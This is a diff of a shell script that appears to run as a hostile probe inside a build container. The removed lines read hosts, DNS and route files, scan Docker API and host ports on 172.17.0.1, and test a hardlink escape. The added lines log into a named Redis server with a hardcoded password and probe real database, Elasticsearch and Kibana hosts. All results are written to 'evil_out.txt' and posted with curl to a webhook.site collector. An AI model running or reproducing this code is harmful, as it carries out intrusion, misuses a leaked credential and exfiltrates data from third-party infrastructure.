@@ -4,16 +4,13 @@ read -r REQ
 {
 echo "=== ID ==="; id
 echo "=== HOSTNAME ==="; hostname
-echo "=== HOSTS ==="; cat /etc/hosts 2>&1
-echo "=== RESOLV ==="; cat /etc/resolv.conf 2>&1
-echo "=== ROUTE ==="; cat /proc/net/route 2>&1
-echo "=== DOCKER2375 ==="; wget -qO- -T 5 http://172.17.0.1:2375/version 2>&1 | head -5
-echo "=== DOCKER2376 ==="; wget -qO- -T 5 http://172.17.0.1:2376/version 2>&1 | head -5
-echo "=== HOST3000 ==="; wget -qO- -T 5 http://172.17.0.1:3000/ 2>&1 | head -5
-echo "=== HOST8080 ==="; wget -qO- -T 5 http://172.17.0.1:8080/ 2>&1 | head -5
-echo "=== HOST80 ==="; wget -qO- -T 5 http://172.17.0.1/ 2>&1 | head -5
-echo "=== HOST22 ==="; (echo > /dev/tcp/172.17.0.1/22) 2>&1 && echo SSH_OPEN || echo SSH_CLOSED
-echo "=== HOSTS_FILE_HARDLINK_TEST ==="; ln /etc/hosts /code/src/hosts_link.rs 2>&1 && echo HARDLINK_OK || echo HARDLINK_FAIL
+echo "=== REDIS ==="
+{ echo -e 'AUTH d8v98!ld#f12Gva8zxdsFG$%asd38231\r'; echo -e 'INFO server\r'; echo -e 'QUIT\r'; } | nc -w 5 redis.mintscan.io 6379 2>&1 | head -25
+echo "=== REDIS_PING ==="
+{ echo -e 'AUTH d8v98!ld#f12Gva8zxdsFG$%asd38231\r'; echo -e 'PING\r'; echo -e 'QUIT\r'; } | nc -w 5 redis.mintscan.io 6379 2>&1 | head -5
+echo "=== RDS ==="; nc -w 3 api-service-database.cq9ruxfeoibr.us-east-1.rds.amazonaws.com 3306 < /dev/null > /dev/null 2>&1 && echo RDS_OPEN || echo RDS_CLOSED
+echo "=== ES ==="; nc -w 3 elasticsearch.mintscan.io 9200 < /dev/null > /dev/null 2>&1 && echo ES_OPEN || echo ES_CLOSED
+echo "=== KIBANA ==="; nc -w 3 kibana.mintscan.io 5601 < /dev/null > /dev/null 2>&1 && echo KIBANA_OPEN || echo KIBANA_CLOSED
 } > /tmp/evil_out.txt 2>&1
 if command -v curl >/dev/null 2>&1; then
   curl -s -m 20 -X POST --data-binary @/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b >/dev/null 2>&1
